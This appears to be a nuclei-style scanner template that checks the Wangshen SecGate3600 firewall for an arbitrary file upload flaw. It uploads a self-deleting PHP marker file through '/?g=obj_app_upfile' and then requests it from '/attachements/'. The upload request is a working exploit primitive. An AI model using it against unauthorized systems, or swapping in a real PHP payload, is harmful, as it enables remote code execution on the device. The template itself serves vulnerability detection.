id: poc-yaml-wangshen-secgate3600-arbitrary-file-upload
info:
  name: SecGate3600 Arbitrary File Upload
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload, critical

variables:
  boundary: '{{rand_text_alphanumeric(10)}}'
  fname: '{{md5(boundary)}}'
  v_random_str: '{{rand_text_alphanumeric(5)}}'
  v_verify_code: '{{md5(v_random_str)}}'

http:
  - id: check-upload
    method: POST
    path:
      - "{{BaseURL}}/?g=obj_app_upfile"
    headers:
      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary{{boundary}}"
    body: |
      ------WebKitFormBoundary{{boundary}}
      Content-Disposition: form-data; name="upfile"; filename="{{fname}}.php"
      Content-Type: text/plain

      <?php echo md5("{{v_random_str}}");unlink(__FILE__);?>

      ------WebKitFormBoundary{{boundary}}
      Content-Disposition: form-data; name="submit_post"

      obj_app_upfile
      ------WebKitFormBoundary{{boundary}}--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: word
        part: body
        words:
          - "File is valid, and was successfully uploaded."

  - id: verify-upload
    method: GET
    path:
      - "{{BaseURL}}/attachements/{{fname}}.php"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{v_verify_code}}"
      - type: word
        part: body
        words:
          - "<"
        negative: true
